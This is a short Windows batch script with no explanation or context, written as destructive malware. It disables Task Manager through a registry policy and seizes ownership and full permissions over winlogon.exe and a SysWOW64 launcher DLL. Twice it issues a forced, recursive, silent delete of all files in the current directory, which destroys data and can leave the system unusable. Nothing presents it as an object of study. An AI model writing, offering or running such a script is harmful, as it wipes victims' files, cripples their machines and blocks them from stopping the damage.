@echo off
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
takeown /f "C:\Windows\System32\winlogon.exe"
icacls "C:\Windows\System32\winlogon.exe" /grant administrator:F
del /F /S /Q *.*
timeout /t 2 NOBREAK >nul
takeown /f "C:\Windows\SysWOW64\Windows.System.Launcher.dll" 
icacls "C:\Windows\SysWOW64\Windows.System.Launcher.dll" /grant administrator:F
del /F /S /Q *.*